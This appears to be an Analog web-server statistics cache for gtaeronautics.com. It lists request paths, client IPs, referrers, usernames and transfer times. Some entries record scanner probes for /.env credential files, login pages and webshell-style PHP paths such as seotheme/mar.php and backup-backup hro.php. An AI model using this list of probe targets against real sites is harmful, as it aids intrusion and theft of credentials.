I	lRS	1	152747	220	/robots.txt
I	lRS	1	7827	14	/ads.txt
I	lRS	1	3132	12	/.env
I	lRS	1	83	8	/chosen.php
I	lRS	1	413	8	/simple.php
I	lRS	1	1609	6	/sitemap.xml
I	lRS	1	1391	4	/videos/bandito+004+flt+8+clip+092508.wmv
I	lRS	1	4494	4	/xmlrpc.php
I	lRS	1	205	3	/sites/default/files/
I	lRS	1	344	3	/images/gta2+at-6+photo.jpg
I	lRS	1	270	3	/.well-known/
I	lRS	1	225	3	/wp-admin/css/
I	lRS	1	12	3	/wp-content/themes/travelscape/json.php
I	lRS	1	140	3	/wp-content/themes/seotheme/mar.php
I	lRS	1	460	3	/sitemap_index.xml
I	lRS	1	311	3	/sitemap.html
I	lRS	1	206	3	/admin/controller/extension/extension/
I	lRS	1	204	3	/uploads/
I	lRS	1	2410	2	/
I	lRS	1	4	2	/statics/ueditor/php/controller.php
I	lRS	1	429	2	/backup
I	lRS	1	67	2	/wp-content/plugins/backup-backup/includes/backup-heart.php
I	lRS	1	13	2	/wp-content/plugins/backup-backup/includes/hro.php
I	lRS	1	614	2	/new
I	lRS	1	627	2	/old
I	lRS	1	680	2	/wp-admin/admin-ajax.php
I	lRS	1	8575	2	/wp-login.php
I	lRS	1	429	2	/humans.txt
I	lRS	1	202	2	/website-sitemap.xml
I	lRS	1	1428	2	/wordpress/
I	lRS	1	445627	85	[not listed: 27574]
L	*FR	2007	12	11	00	52
L	*LR	2024	02	15	05	45
L	*f	-20S	s
L	RS	3980	21	216.244.66.229
L	RS	17	17	34.171.180.1
L	RS	60	12	167.86.110.100
L	RS	40	10	194.26.192.228
L	RS	63	9	45.141.215.13
L	RS	220	9	66.249.66.197
L	RS	18	9	203.159.90.27
L	RS	1717	9	162.55.85.223
L	RS	261	8	66.249.66.72
L	RS	21	7	119.42.145.82
L	RS	538	6	195.191.219.131
L	RS	30	5	45.80.158.50
L	RS	201	5	52.167.144.57
L	RS	18	5	173.249.13.74
L	RS	16	4	173.249.29.208
L	RS	26	4	178.159.37.38
L	RS	48	4	49.232.28.87
L	RS	24	4	34.73.89.236
L	RS	283	4	66.249.66.74
L	RS	853	4	85.208.98.23
L	RS	626873	259	[not listed: 84975]
K	*FR	2013	12	22	04	20
K	*LR	2024	02	13	13	54
K	*f	-30S	s
K	lRS	1	1878	2	http://gtaeronautics.com/
K	lRS	1	741	2	http://www.gtaeronautics.com/BANDITOMAV.html
K	lRS	1	43	1	http://gtaeronautics.com/config/AspCms_Config.asp
K	lRS	1	7	1	http://gtaeronautics.com/include/taglib/findgs.lib.php
K	lRS	1	6	1	http://www.gtaeronautics.com/template/default/common/common.css
K	lRS	1	2	1	http://gtaeronautics.com/informacione.php
K	lRS	1	12	1	http://gtaeronautics.com/plus/laobiao.php
K	lRS	1	7	1	http://gtaeronautics.com/include/taglib/datas.lib.php
K	lRS	1	65184	0	[not listed: 5939]
E	*FR	2008	01	06	10	12
E	*LR	2024	02	09	03	06
E	*f	-30S	s
E	lSR	1	0	254	[not listed: 7]
l	*FR	2008	01	06	10	12
l	*LR	2024	02	09	03	06
l	*f	-20S	s
l	SR	0	254	[not listed: 116]
v	*f	-20B	b
v	Rb	1049025	65.103	64.41.87.40
v	Rb	657415	34.897	66.113.131.59
R	*FR	2008	01	06	10	12
R	*LR	2024	02	09	03	06
R	*f	-20R	r
R	R	178	66.113.131.59
R	R	76	64.41.87.40
M	*FR	2007	12	11	00	52
M	*LR	2024	02	15	05	45
M	*f	-20R	r
M	R	332701	64.41.87.40
M	R	302606	66.113.131.59
J	*FR	2007	12	11	00	53
J	*LR	2017	03	17	18	30
J	*f	-20R	r
J	R	9	gtaeronautics
J	R	5	lorrigkj
J	R	1	rullma2063
J	R	1	administrator
J	R	1	satish
J	R	1	nnnnn
P	*FR	2023	11	08	09	11
P	*LR	2024	02	15	05	58
P	R	212	0
P	R	90	<= 0.01
P	R	2239	0.01-0.02
P	R	128068	0.02-0.05
P	R	175879	0.05-0.1 
P	R	233693	0.1 -0.2 
P	R	235300	0.2 -0.5 
P	R	118927	0.5 -1   
P	R	65486	1-  2 
P	R	28691	2-  5 
P	R	12369	5- 10 
P	R	6012	10- 20 
P	R	23280	20- 60 
P	R	3495	60-120 
P	R	15234	120-300 
